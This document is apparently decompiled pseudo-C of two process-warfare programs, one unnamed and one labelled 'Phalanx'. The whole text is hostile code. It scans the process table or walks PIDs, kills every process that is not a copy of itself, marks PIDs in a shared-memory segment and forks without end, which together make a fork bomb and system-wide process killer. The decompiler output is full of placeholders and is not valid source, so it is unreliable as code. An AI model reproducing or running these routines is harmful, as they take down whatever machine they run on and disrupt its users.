void main() {

	void* ebp1;

	int32_t eax2;

	int32_t v3;

	int32_t eax4;

	void* eax5;

	void* v6;

	int32_t v7;

	int32_t v8;

	int32_t v9;

	int32_t v10;

	struct s0* v11;

	int32_t eax12;

	int32_t eax13;

	int32_t v14;

	struct s1* v15;

	int32_t eax16;

	int32_t eax17;

	int32_t v18;


	ebp1 = (void*)(((uint32_t)"intrinsic"() & 0xfffffff0) - 4 - 4);

	eax2 = getpid();

	v3 = eax2;

	eax4 = getuid();

	while (1) {

		eax5 = readproctab(0x4022, (uint32_t)ebp1 + -52, 1);

		v6 = eax5;

		v7 = (int32_t)"";

		v8 = (int32_t)func_0;

		while (!(int1_t)(*(int32_t*)((int32_t)v6 + v8 * 4) == func_0)) {

			if (**(int32_t**)((int32_t)v6 + v8 * 4) == v3)

				goto addr_0x804866f_5;

			++v8;

		}

		addr_0x80486a3_7:

		v9 = v8 + 1;

		v10 = v8 - 1;

		while (v10 >= (int32_t)func_0 && !(int1_t)(*(int32_t*)((int32_t)v6 + v9 * 4) == func_0)) {

			if (v10 >= (int32_t)func_0) {

				v11 = *(struct s0**)((int32_t)v6 + v10 * 4);

				eax12 = strcmp(v7, (int32_t)v11 + 0x1d8, 1);

				if (eax12 != func_0) {

					kill(-v11->f508, 0x109);

				}

				do {

					eax13 = fork();

					v14 = eax13;

				} while (v14 > (int32_t)func_0);

				if ((int1_t)(v14 == func_0))

					goto addr_0x804871c_14;

				--v10;

			}

			if (*(int32_t*)((int32_t)v6 + v9 * 4) == func_0)

				continue;

			v15 = *(struct s1**)((int32_t)v6 + v9 * 4);

			eax16 = strcmp(v7, (int32_t)v15 + 0x1d8, 1);

			if (eax16 != func_0) {

				kill(-v15->f508, 0x109);

			}

			do {

				eax17 = fork();

				v18 = eax17;

			} while (v18 > (int32_t)func_0);

			if ((int1_t)(v18 == func_0))

				goto addr_0x80487a5_21;

			++v9;

		}

		addr_0x80487d9_23:

		continue;

		addr_0x80487a5_21:

		setpgid(0x10000);

		goto addr_0x80487d9_23;

		addr_0x804871c_14:

		setpgid(0x10000);

		goto addr_0x80487d9_23;

		addr_0x804866f_5:

		v7 = *(int32_t*)((int32_t)v6 + v8 * 4) + 0x1d8;

		goto addr_0x80486a3_7;

	}

}


Phalanx:

int16_t sub_80486BB(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {

	int32_t eax5;

	int32_t ecx6;

	signed char* edi7;

	int32_t tmp32_8;

	struct s0* eax9;

	int32_t eax10;


	eax5 = kill(a1, func_0);

	if (!(int1_t)"intrinsic"()) {

		memset(0x804a0c6, func_0);

		sprintf(0x804a0c6, "%d", a1);

		ecx6 = -1;

		edi7 = (signed char*)0x804a0c0;

		tmp32_8 = 1 - 2 * (int32_t)func_0;

		do {

			if (!ecx6)

				break;

			--ecx6;

			edi7 = (signed char*)((int32_t)edi7 + tmp32_8);

		} while (!(int1_t)(*edi7 == func_0));

		eax9 = (struct s0*)(~ecx6 - 1 + 0x804a0c0);

		eax9->f0 = 0x6578652f;

		eax9->f4 = (signed char)func_0;

		eax10 = readlink(0x804a0c0, 0x804a2c0, 0xc8);

		if ((uint1_t)(eax10 == func_0) | (uint1_t)!(int1_t)("intrinsic"() == func_0))

			goto addr_0x8048781_6;

		eax10 = strcmp(0x804a1c0, 0x804a2c0, 0xc8);

		if (eax10 != func_0)

			goto addr_0x8048771_8;

	} else {

		eax10 = -1;

	}

	addr_0x8048781_6:

	return *(int16_t*)&eax10;

	addr_0x8048771_8:

	eax10 = kill(a1, 9);

	goto addr_0x8048781_6;

}

void sub_8048A20(int32_t a1, int32_t a2, int32_t a3) {

	int32_t edi4;

	int32_t ebx5;

	int32_t ebx6;

	int32_t ebp7;

	int32_t esi8;

	int32_t esi9;

	int32_t v10;

	int32_t v11;


	edi4 = (int32_t)func_0;

	sub_80485F0();

	ebx5 = ebx6 + 0x15d5;

	ebp7 = a1;

	init_proc();

	esi8 = ebx5 + 0xffffff04 - (ebx5 + 0xffffff00) >> 2;

	if (esi8 != func_0) {

		esi9 = esi8;

		do {

			*(int32_t*)(ebx5 + edi4 * 4 + 0xffffff00)(ebp7, v10, v11);

			++edi4;

		} while (edi4 != esi9);

	}

	return;

}

void sub_8048786() {

	int32_t eax1;

	int32_t v2;

	int32_t eip3;

	int32_t eax4;

	int32_t v5;

	int32_t ebp6;

	int32_t v7;

	int32_t eax8;

	int32_t v9;

	int32_t v10;

	int32_t v11;

	int32_t eax12;

	int32_t eax13;

	int32_t eax14;

	int32_t eax15;

	int32_t v16;

	int32_t eax17;

	int32_t eax18;

	int32_t eax19;

	int32_t eax20;

	int32_t eax21;

	int32_t eax22;

	int32_t eax23;

	int32_t v24;

	int32_t eip25;

	int32_t eax26;

	int32_t v27;

	int16_t ax28;

	int16_t ax29;


	eax1 = getpid();

	v2 = eax1;

	eax4 = shm_open("/foo9135", 0xc2, 0x1f8, eip3);

	v5 = eax4;

	if (v5 >= (int32_t)func_0) {

		ftruncate(v5, 0x8001, ebp6, v7);

		eax8 = mmap(func_0);

		v9 = eax8;

		if (!(int1_t)(v9 == func_0)) {

			*(signed char*)(v9 + v2) = 2;

			v10 = v2;

			v11 = v2;

			do {

				while (v10 != v2 && (eax12 = (int32_t)(uint32_t)(unsigned char)*(signed char*)(v9 + v10), !(int1_t)(*(signed char*)&eax12 == func_0))) {

					++v10;

					if (v10 <= 0x8000)

						continue;

					v10 = 0x12d;

				}

				eax13 = (int32_t)(uint32_t)(unsigned char)*(signed char*)(v9 + v10);

				if ((int1_t)(*(signed char*)&eax13 == func_0) && (eax14 = kill(v10, 9), *(signed char*)(v9 + v10) = 1, (int1_t)(eax14 == func_0))) {

					eax15 = fork();

					v16 = eax15;

					if (!(int1_t)(v16 == func_0)) {

						if (v16 > (int32_t)func_0) {

							*(signed char*)(v9 + v2) = 2;

						}

					} else {

						setpgid(func_0);

						eax17 = getpid();

						v2 = eax17;

						*(signed char*)(v9 + v2) = 2;

					}

				}

				while (v11 != v2 && (eax18 = (int32_t)(uint32_t)(unsigned char)*(signed char*)(v9 + v11), !(int1_t)(*(signed char*)&eax18 == func_0))) {

					--v11;

					if (v11 > 0x12c)

						continue;

					v11 = 0x8000;

				}

				eax19 = (int32_t)(uint32_t)(unsigned char)*(signed char*)(v9 + v11);

				if ((int1_t)(*(signed char*)&eax19 == func_0)) {

					eax20 = kill(v11, 9);

					*(signed char*)(v9 + v11) = 1;

					if ((int1_t)(eax20 == func_0)) {

						eax21 = fork();

						v16 = eax21;

					}

					if (!(int1_t)(v16 == func_0)) {

						if (v16 > (int32_t)func_0) {

							*(signed char*)(v9 + v2) = 2;

						}

					} else {

						setpgid(func_0);

						eax22 = getpid();

						v2 = eax22;

						*(signed char*)(v9 + v2) = 2;

					}

				}

			} while (v10 != v2 || v11 != v2);

		}

	}

	eax23 = readlink("/proc/self/exe", 0x804a1c0, 0xc8);

	g804a0c0 = 0x6f72702f;

	g804a0c4 = 0x2f63;

	g804a0c6 = (signed char)func_0;

	while (1) {

		while (v24 = eip25, eax26 = fork(), v27 = eax26, v27 != -1) {

			if (!(int1_t)(v27 == func_0))

				continue;

			setpgid(func_0);

		}

		++v10;

		if (v10 > 0x8000) {

			v10 = 0x12d;

		}

		ax28 = sub_80486BB(v10, 0x804a1c0, 0xc8, v24);

		if (v2 - 50 < v11) {

			--v11;

			ax29 = sub_80486BB(v11, 0x804a1c0, 0xc8, v24);

		}

	}

}